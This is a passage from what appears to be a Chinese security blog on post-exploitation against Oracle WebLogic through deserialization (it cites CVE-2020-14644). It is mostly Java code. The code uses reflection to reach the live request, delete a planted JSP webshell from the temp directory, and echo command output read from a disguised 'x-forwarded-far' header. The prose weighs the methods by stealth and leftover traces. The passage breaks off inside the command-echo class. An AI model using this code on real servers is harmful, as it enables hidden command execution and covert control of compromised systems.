</span></span></code></pre></td></tr></table></div></div><h2 id=wjsp2xjava精准定位临时目录卸载jsp木马>wjsp2x.java：精准定位临时目录卸载jsp木马<a hidden class=anchor aria-hidden=true href=#wjsp2xjava精准定位临时目录卸载jsp木马>#</a></h2><h3 id=注意点-1>注意点<a hidden class=anchor aria-hidden=true href=#注意点-1>#</a></h3><p>可以模拟wjsp2.java的做法删除磁盘上的文件，但需要注意：</p><ol><li>如果在删除文件前访问过webshell，jsp文件就已经转成class，路由也添加了。那么在删除文件只是从磁盘上面删除jsp而已，后门还是可以访问的。</li><li>重新上传同名但是内容不同的jsp文件，并不会再编译一次去覆盖已有的class，也就是说无法更新webshell的功能或者密码。</li></ol><h3 id=最终效果-4>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-4>#</a></h3><p><img loading=lazy src=image-20220701160636961.png alt=image-20220701160636961></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-28>28</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.HttpConnectionHandler<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjspx2</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjspx2</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String temppath <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getTempPath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//            File jsppath=new File(new File(deploydir,temppath),&#34;/war/pages/css/clickjackingScriptbakup_9ik97.jsp&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            File jsppath<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>,</span>temppath<span style=color:#f92672>),</span><span style=color:#e6db74>&#34;/war/pages/css/hineo.jsp&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            jsppath<span style=color:#f92672>.</span><span style=color:#a6e22e>delete</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=servjava通过servlet回显命令执行的结果>serv.java：通过servlet回显命令执行的结果<a hidden class=anchor aria-hidden=true href=#servjava通过servlet回显命令执行的结果>#</a></h2><h3 id=探索过程-2>探索过程<a hidden class=anchor aria-hidden=true href=#探索过程-2>#</a></h3><p>尝试通过当前线程获取到request对象，向其中写内容来显示命令执行的结果，也正是在这个过程中想到了wjsp2.java的解法。</p><p>尝试直接获取connectionHandler时提示私有属性无法直接获取</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ByteArrayInputStream<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>mems</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>mems</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span><span style=color:#f92672>((</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>connectionHandler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>().</span><span style=color:#a6e22e>writeStream</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ByteArrayInputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hacked!!!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220701143006110.png alt=image-20220701143006110></p><p>会报错</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-101-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-101-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>java: connectionHandler has private access in weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor
</span></span></code></pre></td></tr></table></div></div><p>于是尝试通过反射来调用私有变量，成功获取到request对象。</p><p>参考：</p><p><a href=https://xz.aliyun.com/t/7740#toc-4>https://xz.aliyun.com/t/7740#toc-4</a></p><p><a href=https://paper.seebug.org/1442/#1-cve-2020-14644>https://paper.seebug.org/1442/#1-cve-2020-14644</a></p><h3 id=优缺点-3>优缺点<a hidden class=anchor aria-hidden=true href=#优缺点-3>#</a></h3><p>优点</p><ol><li>没有文件落地</li><li>系统无残留，不需要卸载过程</li></ol><p>缺点</p><ol><li>每次执行命令都要触发一次反序列化，动静大，不优雅</li><li>存在环境不确定性，可能因为不同版本代码写法不同导致获取不到request对象</li></ol><h3 id=最终效果-5>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-5>#</a></h3><p><img loading=lazy src=image-20220701150247898.png alt=image-20220701150247898></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-29>29</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.HttpConnectionHandler<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.ServletOutputStreamImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.ServletResponseImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>serv</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>serv</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletResponseImpl resp <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            String ncmd<span style=color:#f92672>=</span>httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>ncmd<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;\n===========\n&#34;</span><span style=color:#f92672>);</span>
